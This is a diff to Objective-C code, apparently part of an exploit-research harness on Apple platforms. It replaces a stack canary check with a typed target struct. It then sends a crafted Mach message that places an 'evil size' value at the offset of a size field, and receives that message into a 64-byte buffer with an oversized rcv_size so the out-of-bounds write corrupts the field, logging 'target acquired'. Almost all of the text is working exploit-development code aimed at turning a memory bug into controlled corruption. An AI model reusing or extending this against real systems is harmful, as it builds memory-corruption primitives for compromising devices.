@@ -1520,32 +1520,55 @@ cleanup:
                                     if (kr == MACH_MSG_SUCCESS) {
                                         // Receive with SMALL buffer but LARGE rcv_size
                                         // Canary is INSIDE the same stack struct, right after smallBuf
+                                        // Typed target: size field at canary position
                                         struct {
                                             uint8_t smallBuf[64];
-                                            uint64_t canary;
-                                            uint8_t pad[56];
+                                            uint32_t tgt_size;   // TARGET — OOB write hits this
+                                            uint32_t tgt_pad;
+                                            uint64_t tgt_ptr;
+                                            uint8_t pad[48];
                                         } stackZone;
                                         memset(&stackZone, 0x55, sizeof(stackZone));
-                                        stackZone.canary = 0xCAFEBABEDEADBEEFULL;
+                                        stackZone.tgt_size = 0x00000100;  // known size
+                                        stackZone.tgt_ptr = 0x4141414141414141ULL;
 
-                                        // Tell kernel rcv_size=256 (larger than 64-byte buffer)
+                                        // Send message with crafted data that overwrites tgt_size
+                                        // Data at offset 64 in the message = tgt_size position
+                                        // We want to write 0x00000042 (66) there
+                                        uint8_t sendBuf2[256];
+                                        memset(sendBuf2, 0x44, sizeof(sendBuf2));
+                                        mach_msg_header_t *shdr2 = (mach_msg_header_t *)sendBuf2;
+                                        shdr2->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                                        shdr2->msgh_size = 128;
+                                        shdr2->msgh_remote_port = wrxPort;
+                                        shdr2->msgh_local_port = MACH_PORT_NULL;
+                                        shdr2->msgh_id = 0x2338;
+                                        // Place evil size at the offset that maps to tgt_size
+                                        // smallBuf=64 bytes, so offset 64 in message = tgt_size
+                                        *(uint32_t *)(sendBuf2 + 24 + 40) = 0x00000042;  // evil size
+                                        kr = mach_msg(shdr2, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                            128, 0, MACH_PORT_NULL, 100, MACH_PORT_NULL);
+
+                                        // Receive with oversized rcv_size
                                         mach_msg_header_t *rhdr = (mach_msg_header_t *)stackZone.smallBuf;
                                         kr = mach_msg(rhdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                            0, 256,  // rcv_size = 256 >> 64 = OOB write
-                                            wrxPort, 100, MACH_PORT_NULL);
+                                            0, 256, wrxPort, 100, MACH_PORT_NULL);
                                         scopeNote(r, [NSString stringWithFormat:
-                                            @"  OOB-WRITE recv ret=%d  rcv_size=256  buf=64", (int)kr]);
+                                            @"  OOB-WRITE recv ret=%d  tgt_size was 0x100", (int)kr]);
 
                                         if (kr == MACH_MSG_SUCCESS) {
-                                            uint64_t canaryVal = stackZone.canary;
+                                            uint32_t szAfter = stackZone.tgt_size;
                                             scopeNote(r, [NSString stringWithFormat:
-                                                @"  canary: 0x%016llx (was 0xCAFEBABEDEADBEEF)", (unsigned long long)canaryVal]);
-                                            if (canaryVal != 0xCAFEBABEDEADBEEFULL) {
-                                                scopeNote(r, @"  >>> OOB WRITE CONFIRMED — canary overwritten by kernel!");
+                                                @"  tgt_size: 0x00000100 -> 0x%08x  tgt_ptr=0x%016llx",
+                                                szAfter, (unsigned long long)stackZone.tgt_ptr]);
+                                            if (szAfter != 0x100) {
+                                                scopeNote(r, @"  >>> SIZE FIELD CORRUPTED via mach_msg OOB write!");
+                                                scopeNote(r, [NSString stringWithFormat:
+                                                    @"  >>> kernel wrote 0x%x past buffer — target acquired", szAfter]);
                                             } else {
-                                                scopeNote(r, @"  canary intact — kernel limited copy to message size");
+                                                scopeNote(r, @"  tgt_size intact — OOB did not reach it");
                                             }
-                                            // Dump the zone
+                                            // Dump
                                             NSMutableString *hex = [NSMutableString string];
                                             for (int j = 0; j < 96; j++)
                                                 [hex appendFormat:@"%02x ", ((uint8_t *)&stackZone)[j]];
